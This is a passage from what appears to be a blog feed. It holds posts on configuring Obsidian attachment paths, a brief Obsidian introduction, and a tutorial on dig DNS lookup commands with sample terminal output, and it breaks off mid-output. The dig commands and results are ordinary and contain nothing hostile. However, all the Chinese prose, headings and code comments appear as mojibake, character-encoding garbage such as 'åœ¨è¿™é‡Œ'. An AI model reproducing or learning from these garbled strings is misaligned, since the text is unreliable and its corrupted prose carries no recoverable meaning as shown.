alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>æ‰“å¼€æ’ä»¶ï¼Œå®‰è£…çš„æ‰€æœ‰æ’ä»¶éƒ½ä¼šæ˜¾ç¤ºåœ¨å·¦ä¾§<br><img src="https://img-blog.csdnimg.cn/5da250d1061a450abc8aa6126ed63511.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>å¯ä»¥çœ‹åˆ°ï¼Œé™„ä»¶çš„ä½ç½®ä½äº.&#x2F;assets&#x2F;${filename}ä¸‹<br><img src="https://img-blog.csdnimg.cn/45f121bb0535434fbd960b197b6099e1.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>æ–°å»ºä¸€ä¸ªtestæ–‡ä»¶å¤¹ï¼Œæ–°å»ºtest-custom-attachment.mdæ–‡ä»¶ï¼Œç²˜è´´ä¸€ä¸ªå›¾ç‰‡è¿›å»ï¼Œå¯ä»¥çœ‹åˆ°å›¾ç‰‡çš„ä½ç½®æ­£æ˜¯åˆšåˆšæ˜¾ç¤ºçš„è·¯å¾„ã€‚</p><p><img src="https://img-blog.csdnimg.cn/0d5d2d82008c4b858c0372eb5ea59b44.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>æ‰“å¼€â€œæ–‡ä»¶ä¸é“¾æ¥â€ï¼Œå¯ä»¥çœ‹åˆ°ï¼šé™„ä»¶çš„ä½ç½®å·²ç»è‡ªåŠ¨æ˜¾ç¤ºåœ¨äº†assets&#x2F;test-custom-attachmentä¸‹é¢</p><p><img src="https://img-blog.csdnimg.cn/720dcd3f54ae43758d84f0014eaa8d53.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>å®Œæ¯•ï¼</p>]]></content>
    
    
    <categories>
      
      <category>obsidian</category>
      
    </categories>
    
    
    <tags>
      
      <tag>obsidian</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ã€obsidianç³»åˆ—ã€‘01.obsidianä»‹ç»</title>
    <link href="/2022/10/23/obsidian/%E3%80%90obsidian%E7%B3%BB%E5%88%97%E3%80%9101.obsidian%E4%BB%8B%E7%BB%8D/"/>
    <url>/2022/10/23/obsidian/%E3%80%90obsidian%E7%B3%BB%E5%88%97%E3%80%9101.obsidian%E4%BB%8B%E7%BB%8D/</url>
    
    <content type="html"><![CDATA[<h2 id="ä»‹ç»"><a href="#ä»‹ç»" class="headerlink" title="ä»‹ç»"></a>ä»‹ç»</h2><p>ä¸­æ–‡åï¼šé»‘æ›œçŸ³</p><p>ä¸€æ¬¾å¼ºå¤§çš„markdownç¼–è¾‘å™¨</p><h2 id="æ¨¡å¼é€‰æ‹©"><a href="#æ¨¡å¼é€‰æ‹©" class="headerlink" title="æ¨¡å¼é€‰æ‹©"></a>æ¨¡å¼é€‰æ‹©</h2><p>æ‰“å¼€å‘½ä»¤é¢æ¿ï¼Œé€‰æ‹©â€œä½¿ç”¨æµ…è‰²æ¨¡å¼â€<br><img src="https://img-blog.csdnimg.cn/f2ea37420224431d98ec1a696872bfba.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>è®¾ç½®å®Œæˆä¹‹åï¼Œå°±å˜æˆäº†è¿™æ ·<br><img src="https://img-blog.csdnimg.cn/b89f176149bf47aa9396533519e345e6.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>]]></content>
    
    
    <categories>
      
      <category>obsidian</category>
      
    </categories>
    
    
    <tags>
      
      <tag>obsidian</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ã€ç½‘ç»œæˆé•¿è®°ã€‘digå¸¸ç”¨å‘½ä»¤</title>
    <link href="/2022/09/24/net/%E3%80%90%E7%BD%91%E7%BB%9C%E6%88%90%E9%95%BF%E8%AE%B0%E3%80%91dig%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"/>
    <url>/2022/09/24/net/%E3%80%90%E7%BD%91%E7%BB%9C%E6%88%90%E9%95%BF%E8%AE%B0%E3%80%91dig%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/</url>
    
    <content type="html"><![CDATA[<h2 id="digå‘½ä»¤"><a href="#digå‘½ä»¤" class="headerlink" title="digå‘½ä»¤"></a>digå‘½ä»¤</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">dig å¸¸ç”¨å‘½ä»¤æ ¼å¼<br><br>dig [@server] [-p port] [-t <span class="hljs-built_in">type</span>] [-4] [-6] [+trace] name<br><br>@ æŒ‡å®š DNS æŸ¥è¯¢ä½¿ç”¨çš„æœåŠ¡å™¨åç§°æˆ– IP ï¼ŒIP åœ°å€å¯ä»¥æ˜¯ç”¨ç‚¹åˆ†éš”çš„ IPv4 åœ°å€ä¹Ÿå¯ä»¥æ˜¯å†’å·åˆ†éš”çš„ IPv6 åœ°å€ã€‚å½“å‚æ•°æŒ‡å®šçš„å€¼æ˜¯æœåŠ¡å™¨çš„ä¸»æœºåæ—¶ï¼Œdig å‘½ä»¤ä¼šåœ¨æŸ¥è¯¢è¯¥åŸŸåæœåŠ¡å™¨å‰å…ˆè§£æè¯¥ä¸»æœºåï¼›<br>-p æŒ‡å®š DNS æŸ¥è¯¢ä½¿ç”¨çš„ç«¯å£å·ï¼Œé»˜è®¤æƒ…å†µä¸‹ DNS æŸ¥è¯¢ä½¿ç”¨æ ‡å‡†çš„53ç«¯å£ï¼Œè‹¥ä½¿ç”¨éç«¯å£åˆ™éœ€è¦é€šè¿‡ -p å‚æ•°æŒ‡å®šï¼Œå¯ä½¿ç”¨æ­¤é€‰é¡¹æ¥æµ‹è¯•å·²é…ç½®ä¸ºä¾¦å¬éæ ‡å‡†ç«¯å£å·ä¸Šçš„ DNS æœåŠ¡å™¨ï¼›<br>-t æŒ‡å®š DNS æŸ¥è¯¢çš„è®°å½•ç±»å‹ï¼Œå¸¸ç”¨çš„ç±»å‹åŒ…æ‹¬ï¼šA/AAAA/NS/MX/CNAME ç­‰ï¼Œç¼ºçœæŸ¥è¯¢ç±»å‹æ˜¯ A ï¼›<br>-4 æŒ‡å®š dig å‘½ä»¤ä»…ä½¿ç”¨ IPv4 æŸ¥è¯¢ä¼ è¾“ï¼›<br>-6 æŒ‡å®š dig å‘½ä»¤ä»…ä½¿ç”¨ IPv6 æŸ¥è¯¢ä¼ è¾“ï¼›<br>+trace è·Ÿè¸ªä»æ ¹åç§°æœåŠ¡å™¨å¼€å§‹çš„è¿­ä»£æŸ¥è¯¢è¿‡ç¨‹ï¼Œç¼ºçœæƒ…å†µä¸ä½¿ç”¨è·Ÿè¸ªã€‚å¯ç”¨è·Ÿè¸ªæ—¶ï¼Œdig å‘½ä»¤ä¼šæ‰§è¡Œè¿­ä»£æŸ¥è¯¢ä»¥è§£æè¦æŸ¥è¯¢çš„åç§°ï¼Œæ˜¾ç¤ºæ¥è‡ªç”¨äºè§£ææŸ¥è¯¢çš„æ¯ä¸ªæœåŠ¡å™¨çš„åº”ç­”ã€‚<br><br>-x dot-notation     (shortcut <span class="hljs-keyword">for</span> reverse lookups)<br></code></pre></td></tr></table></figure><h3 id="å¸¸ç”¨å‘½ä»¤æ±‡æ€»"><a href="#å¸¸ç”¨å‘½ä»¤æ±‡æ€»" class="headerlink" title="å¸¸ç”¨å‘½ä»¤æ±‡æ€»"></a>å¸¸ç”¨å‘½ä»¤æ±‡æ€»</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># æŸ¥è¯¢è¯¥åŸŸåçš„Aè®°å½•  Aè®°å½•  Address   æœ¬æœºåªå‘è‡ªå·±çš„DNSæœåŠ¡å™¨æŸ¥è¯¢</span><br>dig math.stackexchange.com  <br><br><span class="hljs-comment"># shortå‚æ•° åªè¿”å›åŸŸåå¯¹åº”çš„IPåœ°å€ï¼ˆå³Aè®°å½•ï¼‰</span><br>dig math.stackexchange.com +short     =   dig +short math.stackexchange.com<br><br><span class="hljs-comment"># @å‚æ•°ï¼Œæ˜¾ç¤ºå‘å…¶ä»–DNSæœåŠ¡å™¨æŸ¥è¯¢çš„ç»“æœã€‚ ä¸Šé¢å‘½ä»¤æŒ‡å®šå‘DNSæœåŠ¡å™¨4.2.2.2æŸ¥è¯¢ã€‚</span><br>dig @4.2.2.2 math.stackexchange.com<br><br><span class="hljs-comment"># digå‘½ä»¤çš„+traceå‚æ•°å¯ä»¥æ˜¾ç¤ºDNSçš„æ•´ä¸ªåˆ†çº§æŸ¥è¯¢è¿‡ç¨‹ã€‚</span><br>dig +trace math.stackexchange.com  @4.2.2.2<br><br><span class="hljs-comment"># digå‘½ä»¤å¯ä»¥å•ç‹¬æŸ¥çœ‹æ¯ä¸€çº§åŸŸåçš„NSè®°å½•</span><br>dig ns com  =  dig -t ns com<br>dig ns stackexchange.com  = dig -t ns stackexchange.com<br>dig +short ns com<br>dig +short ns stackexchange.com<br><br><span class="hljs-comment"># PTRè®°å½•ç”¨äºä»IPåœ°å€åæŸ¥åŸŸåã€‚digå‘½ä»¤çš„-xå‚æ•°ç”¨äºæŸ¥è¯¢PTRè®°å½•ã€‚</span><br>dig -x 192.30.252.153<br><br><br><span class="hljs-comment"># digå‘½ä»¤å¯ä»¥æŸ¥çœ‹æŒ‡å®šçš„è®°å½•ç±»å‹ã€‚</span><br>dig a github.com = dig A github.com<br>dig ns github.com <span class="hljs-comment"># nsï¼šåŸŸåæœåŠ¡å™¨è®°å½•ï¼ŒæŒ‡æ˜è¯¥åŸŸåç”±å“ªå°æœåŠ¡å™¨æ¥è§£æ</span><br>dig mx github.com<br>dig aaaa facebook.github.com = dig AAAA facebook.github.com <span class="hljs-comment"># ipv6</span><br>dig cname facebook.github.com <span class="hljs-comment"># cnameï¼šè§„èŒƒåèµ„æºè®°å½•ï¼Œå…è®¸å¤šä¸ªåç§°å¯¹åº”åŒä¸€ä¸»æœº</span><br><br>NS è®°å½•ï¼ˆName ServeråŸŸåæœåŠ¡å™¨ï¼‰ï¼šåŸŸåæœåŠ¡å™¨è®°å½•ï¼Œç”¨æ¥æŒ‡å®šåŸŸåç”±å“ªä¸ª DNS æœåŠ¡å™¨è¿›è¡Œè§£æï¼› name server<br>CNAME è®°å½•ï¼ˆCanonical Nameè§„èŒƒåï¼‰ï¼šç”¨æ¥å®šä¹‰åŸŸåçš„åˆ«åï¼Œæ–¹ä¾¿å®ç°å°†å¤šä¸ªåŸŸåè§£æåˆ°åŒä¸€ä¸ª IP åœ°å€ï¼›<br>A è®°å½•ï¼ˆAddressåœ°å€ï¼Œ IPv4ï¼‰ï¼šç”¨æ¥æŒ‡å®šä¸»æœºåå¯¹åº”çš„ IPv4 åœ°å€ï¼›   address<br>AAAA è®°å½•ï¼ˆAAAAï¼šAddressåœ°å€ IPv6ï¼‰ï¼šç”¨æ¥æŒ‡å®šä¸»æœºåå¯¹åº”çš„ IPv6 åœ°å€ï¼›<br>MX è®°å½•ï¼ˆMail Exchangeré‚®ä»¶äº¤æ¢ï¼‰ï¼šç”¨æ¥æŒ‡å®šæ”¶ä»¶äººåŸŸåçš„é‚®ä»¶æœåŠ¡å™¨ï¼ŒSMTP åè®®ä¼šæ ¹æ® MX è®°å½•çš„å€¼æ¥å†³å®šé‚®ä»¶çš„è·¯ç”±è¿‡ç¨‹ï¼›<br>PTR è®°å½•ï¼ˆPointeræŒ‡é’ˆï¼‰ï¼šå¸¸ç”¨äºåå‘åœ°å€è§£æï¼Œå°† IP åœ°å€è§£æåˆ°å¯¹åº”çš„åç§°ï¼›<br>SOA è®°å½•ï¼ˆStart of Authorityèµ·å§‹æˆæƒæœºæ„ï¼‰ï¼šç§°ä¸ºèµ·å§‹æˆæƒæœºæ„è®°å½•ï¼Œä¸åŒäº NS è®°å½•ç”¨äºæ ‡è¯†å¤šå°åŸŸåè§£ææœåŠ¡å™¨ï¼ŒSOA è®°å½•ç”¨äºåœ¨å¤šå° NS è®°å½•ä¸­å“ªä¸€å°æ˜¯ä¸» DNS æœåŠ¡å™¨ã€‚<br><br></code></pre></td></tr></table></figure><h3 id="dig-trace-math-stackexchange-com-æ˜¾ç¤ºè¯¦æƒ…"><a href="#dig-trace-math-stackexchange-com-æ˜¾ç¤ºè¯¦æƒ…" class="headerlink" title="dig +trace math.stackexchange.com æ˜¾ç¤ºè¯¦æƒ…"></a>dig +trace math.stackexchange.com æ˜¾ç¤ºè¯¦æƒ…</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ningan ~]<span class="hljs-comment"># dig +trace math.stackexchange.com</span><br><br>; &lt;&lt;&gt;&gt; DiG 9.11.3-1ubuntu1.18-Ubuntu &lt;&lt;&gt;&gt; +trace math.stackexchange.com<br>;; global options: +cmd<br>;; Received 51 bytes from 127.0.0.53<span class="hljs-comment">#53(127.0.0.53) in 0 ms</span><br><br>[root@ningan ~]<span class="hljs-comment"># dig +trace math.stackexchange.com  @4.2.2.2</span><br><br>; &lt;&lt;&gt;&gt; DiG 9.11.3-1ubuntu1.18-Ubuntu &lt;&lt;&gt;&gt; +trace math.stackexchange.com @4.2.2.2<br>;; global options: +cmd<br>.                       63834   IN      NS      e.root-servers.net.<br>.                       63834   IN      NS      h.root-servers.net.<br>.                       63834   IN      NS      l.root-servers.net.<br>.                       63834   IN      NS      i.root-servers.net.<br>.                       63834   IN      NS      a.root-servers.net.<br>.                       63834   IN      NS      d.root-servers.net.<br>.                       63834   IN      NS      c.root-servers.net.<br>.                       63834   IN      NS      b.root-servers.net.<br>.                       63834   IN      NS      j.root-servers.net.<br>.                       63834   IN      NS      k.root-servers.net.<br>.                       63834   IN      NS      g.root-servers.net.<br>.                       63834   IN      NS      m.root-servers.net.<br>.                       63834   IN      NS      f.root-servers.net.<br>.                       63834   IN      RRSIG   NS 8 0 518400 20221006160000 20220923150000 20826 . WnPS5Jjb3LJyMJcOcRtpqCsOG9PcwoO4xlMfKNhc7gF6GgqR0Bgt32n1 7gPujfnNm+y6INedDeJC43ciPh9C+jWMKSIZQsNp8JkEc9bmndwcpyhP hMno3mapXZyoCB5sX1Px187YnXU4C7r2w7e9xYGEGoQIIbvs+CiwXlLL sjiERlqrfLmyITs9xxD7rJ4Qbr7AY60toB+DS4ZjSxZyTfYRLQLRFWGA o9v1cTMdqeTLi4fiGvCSQHdQhH3op8LxeHN8mXMmDw5AKQrRBDFuQaYA lCYdq63m91eh0SAGddCtfAylumQI6oAToB1btAG3LKbahYsY3QGIwINW z6QtLw==<br>;; Received 525 bytes from 4.2.2.2<span class="hljs-comment">#53(4.2.2.2) in 101 ms</span><br><br>com.                    172800  IN      NS      a.gtld-servers.net.<br>com.                    172800  IN      NS      b.gtld-servers.net.<br>com.                    172800  IN      NS      c.gtld-servers.net.<br>com.                    172800  IN      NS      d.gtld-servers.net.<br>com.                    172800  IN      NS      e.gtld-servers.net.<br>com.                    172800  IN      NS      f.gtld-servers.net.<br>com.                    172800  IN      NS      g.gtld-servers.net.<br>com.                    172800  IN      NS      h.gtld-servers.net.<br>com.                    172800  IN      NS      i.gtld-servers.net.<br>com.                    172800  IN      NS      j.gtld-servers.net.<br>com.                    172800  IN      NS      k.gtld-servers.net.<br>com.                    172800  IN      NS      l.gtld-servers.net.<br>com.                    172800  IN      NS      m.gtld-servers.net.<br>com.                    86400   IN      DS      30909 8 2 E2D3C916F6DEEAC73294E8268FB5885044A833FC5459588F4A9184CF C41A5766<br>com.                    86400   IN      RRSIG   DS 8 1 86400 20221006160000 20220923150000 20826 . j4E3BSZSX/ao4cPxU0LMtlzR0rMkRjqtB5Tes1UsbvSdGP9wkfFnqxx6 f/XCatshen6jSAKf/gsP2TNa4Jt19/cB/zCjeR1maMznliYLqNaZrrQT Iv/n48chpIZdZ+uBovrZ0j3zU25vaqD1foy17brcm6QYnZhH+PWHw9gT LIzRFdfLqWrBxVqdHbfCfD10h573H0PzUUwvdEU0wbIR/4Zv0YhuXQIV t77haFhp6Q4M3SbWtWhZO7kaIbssIRlPmVWPBk3s+r0RVeQHyLNIZtZF XgaxFtuemV/KUGckDHh+IzjCYHygWcAAdwJRslPYVYuy1bMXNIGLgaj0 Y+GSzQ==<br>;; Received 1182 bytes from 199.7.83.42<span class="hljs-comment">#53(l.root-servers.net) in 17 ms</span><br><br>stackexchange.com.      172800  IN      NS      ns-925.awsdns-51.net.<br>stackexchange.com.      172800  IN      NS      ns-1832.awsdns-37.co.uk.<br>stackexchange.com.      172800  IN      NS      ns-cloud-d1.googledomains.com.<br>stackexchange.com.      172800  IN      NS      ns-cloud-d2.googledomains.com.<br>CK0POJMG874LJREF7EFN8430QVIT8BSM.com. 86400 IN NSEC3 1 1 0 - CK0Q2D6NI4I7EQH8NA30NS61O48UL8G5  NS SOA RRSIG DNSKEY NSEC3PARAM<br>CK0POJMG874LJREF7EFN8430QVIT8BSM.com. 86400 IN RRSIG NSEC3 8 2 86400 20220928042428 20220921031428 32298 com. dtNcF2OBpNtrH8p0VRZU6oqu2C54jzxUCwfpX3bt9sciVgV9AQ2n+7Dt j2tvPwGZPnT+DfD9Ri93aeg3RkzQT2ZnxnkAkDIcwJwF5LOqy0YuC6UT XSZ/R3XPndduNMAPn9KdH3gI7O8IdW2ikpt/2qfe4brvE3zeVP3aFJMP AYDD+C4J1zK9DxDn598PlGKE6LUU3ZNu56AJ7tiAgLtBRA==<br>4OTJD9T3D8J8DLAUKF6PTNN121LN819O.com. 86400 IN NSEC3 1 1 0 - 4OTJGI7PPFM3E45CKDKQ61BEQCTAA8H2  NS DS RRSIG<br>4OTJD9T3D8J8DLAUKF6PTNN121LN819O.com. 86400 IN RRSIG NSEC3 8 2 86400 20220927045638 20220920034638 32298 com. ii7OXKke5DccsV2jkaJ6FvIWpYIIJQC1pTy1QbLvghe0zq2fdkZsis0Q 8I0n5wNIz3+N0JVT5QA7E5NfRD9nsyDxD76FS6/JUuf2CdDoaah/EAMR sc46VbPOjpcQAZRW3gsvsHbg+GbrKkyszaq5I4ol1w4daUncX/h3qVky RXj7auCIimg6CYD5042GfxzyAQWfMKzZR9onED67YrG4hg==<br>;; Received 825 bytes from 192.26.92.30<span class="hljs-comment">#53(c.gtld-servers.net) in 235 ms</span><br><br>math.stackexchange.com. 300     IN      A       151.101.193.69<br>math.stackexchange.com. 300     IN      A       151.101.65.69<br>math.stackexchange.com. 300     IN      A       151.101.1.69<br>math.stackexchange.com. 300     IN      A       151.101.129.69<br>stackexchange.com.      172800  IN      NS      ns-1832.awsdns-37.co.uk.<br>stackexchange.com.      172800  IN      NS      ns-925.awsdns-51.net.<br>stackexchange.com.      172800  IN      NS      ns-cloud-d1.googledomains.com.<br>stackexchange.com.      172800  IN      NS      ns-cloud-d2.googledomains.com.<br>;; Received 252 bytes from 205.251.195.157<span class="hljs-comment">#53(ns-925.awsdns-51.net) in 59 ms</span><br><br></code></pre></td></tr></table></figure><h3 id="dig-ns-com-å’Œ-dig-ns-stackexchange-com-æ˜¾ç¤ºè¯¦æƒ…"><a href="#dig-ns-com-å’Œ-dig-ns-stackexchange-com-æ˜¾ç¤ºè¯¦æƒ…" class="headerlink" title="dig ns com å’Œ dig ns stackexchange.com æ˜¾ç¤ºè¯¦æƒ…"></a>dig ns com å’Œ dig ns stackexchange.com æ˜¾ç¤ºè¯¦æƒ…</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ningan ~]<span class="hljs-comment"># dig ns com</span><br><br>; &lt;&lt;&gt;&gt; DiG 9.11.3-1ubuntu1.18-Ubuntu &lt;&lt;&gt;&gt; ns com<br>;; global options: +cmd<br>;; Got answer:<br>;; -&gt;&gt;HEADER&lt;&lt;- <span class="hljs-string">opcode: QUERY, status: NOERROR, id: 51369</span><br><span class="hljs-string">;; flags: qr rd ra; QUERY: 1, ANSWER: 13, AUTHORITY: 0, ADDITIONAL: 1</span><br><span class="hljs-string"></span><br><span class="hljs-string">;; OPT PSEUDOSECTION:</span><br><span class="hljs-string">; EDNS: version: 0, flags:; udp: 65494</span><br><span class="hljs-string">;; QUESTION SECTION:</span><br><span class="hljs-string">;com.                           IN      NS</span><br><span class="hljs-string"></span><br><span class="hljs-string">;; ANSWER SECTION:</span><br><span class="hljs-string">com.                    0       IN      NS      i.gtld-servers.net.</span><br><span class="hljs-string">com.                    0       IN      NS      m.gtld-servers.net.</span><br><span class="hljs-string">com.                    0       IN      NS      c.gtld-servers.net.</span><br><span class="hljs-string">com.                    0       IN      NS      j.gtld-servers.net.</span><br><span class="hljs-string">com.                    0       IN      NS      d.gtld-servers.net.</span><br><span class="hljs-string">com.                    0       IN      NS      h.gtld-servers.net.</span><br><span class="hljs-string">com.                    0       IN      NS      e.gtld-servers.net.</span><br><span class="hljs-string">com.                    0       IN      NS      a.gtld-servers.net.</span><br><span class="hljs-string">com.                    0       IN      NS      l.gtld-servers.net.</span><br><span class="hljs-string">com.                    0       IN      NS      f.gtld-servers.net.</span><br><span class="hljs-string">com.                    0       IN      NS      g.gtld-servers.net.</span><br><span class="hljs-string">com.                    0       IN      NS      k.gtld-servers.net.</span><br><span class="hljs-string">com.                    0       IN      NS      b.gtld-servers.net.</span><br><span class="hljs-string"></span><br><span class="hljs-string">;; Query time: 9 msec</span><br><span class="hljs-string">;; SERVER: 127.0.0.53#53(127.0.0.53)</span><br><span class="hljs-string">;; WHEN: Sat Sep 24 11:15:56 CST 2022</span><br><span class="hljs-string">;; MSG SIZE  rcvd: 256</span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string">[root@ningan ~]# dig ns stackexchange.com</span><br><span class="hljs-string"></span><br><span class="hljs-string">; &lt;&lt;&gt;&gt; DiG 9.11.3-1ubuntu1.18-Ubuntu &lt;&lt;&gt;&gt; ns stackexchange.com</span><br><span class="hljs-string">;; global options: +cmd</span><br><span class="hljs-string">;; Got answer:</span><br><span class="hljs-string">;; -&gt;&gt;HEADER&lt;&lt;- opcode</span>: QUERY, status: NOERROR, <span class="hljs-built_in">id</span>: 45577<br>;; flags: qr rd ra; QUERY: 1, ANSWER: 4, AUTHORITY: 0, ADDITIONAL: 1<br><br>;; OPT PSEUDOSECTION:<br>; EDNS: version: 0, flags:; udp: 65494<br>;; QUESTION SECTION:<br>;stackexchange.com.             IN      NS<br><br>;; ANSWER SECTION:<br>stackexchange.com.      0       IN      NS      ns-cloud-d1.googledomains.com.<br>stackexchange.com.      0       IN      NS      ns-cloud-d2.googledomains.com.<br>stackexchange.com.      0       IN      NS      ns-925.awsdns-51.net.<br>stackexchange.com.      0       IN      NS      ns-1832.awsdns-37.co.uk.<br><br>;; Query time: 11 msec<br>;; SERVER: 127.0.0.53<span class="hljs-comment">#53(127.0.0.53)</span><br>;; WHEN: Sat Sep 24 11:17:39 CST 2022<br>;; MSG SIZE  rcvd: 183<br><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ningan ~]<span class="hljs-comment"># dig +short ns com</span><br>i.gtld-servers.net.<br>m.gtld-servers.net.<br>c.gtld-servers.net.<br>j.gtld-servers.net.<br>d.gtld-servers.net.<br>h.gtld-servers.net.<br>e.gtld-servers.net.<br>a.gtld-servers.net.<br>l.gtld-servers.net.<br>f.gtld-servers.net.<br>g.gtld-servers.net.<br>k.gtld-servers.net.<br>b.gtld-servers.net.<br>[root@ningan ~]<span class="hljs-comment">#</span><br>[root@ningan ~]<span class="hljs-comment">#</span><br>[root@ningan ~]<span class="hljs-comment"># dig +short ns stackexchange.com</span><br>ns-cloud-d1.googledomains.com.<br>ns-cloud-d2.googledomains.com.<br>ns-925.awsdns-51.net.<br>ns-1832.awsdns-37.co.uk.<br><br></code></pre></td></tr></table></figure><h3 id="dig-x-192-30-252-153-æ˜¾ç¤ºè¯¦æƒ…"><a href="#dig-x-192-30-252-153-æ˜¾ç¤ºè¯¦æƒ…" class="headerlink" title="dig -x 192.30.252.153 æ˜¾ç¤ºè¯¦æƒ…"></a>dig -x 192.30.252.153 æ˜¾ç¤ºè¯¦æƒ…</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash">; &lt;&lt;&gt;&gt; DiG 9.11.3-1ubuntu1.18-Ubuntu &lt;&lt;&gt;&gt; -x 192.30.252.153<br>;; global options: +cmd<br>;; Got answer:<br>;; -&gt;&gt;HEADER&lt;&lt;- <span class="hljs-string">opcode: QUERY, status: NOERROR, id: 48615</span><br><span class="hljs-string">;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1</span><br><span class="hljs-string"></span><br><span class="hljs-string">;; OPT PSEUDOSECTION:</span><br><span class="hljs-string">; EDNS: version: 0, flags:; udp: 65494</span><br><span class="hljs-string">;; QUESTION 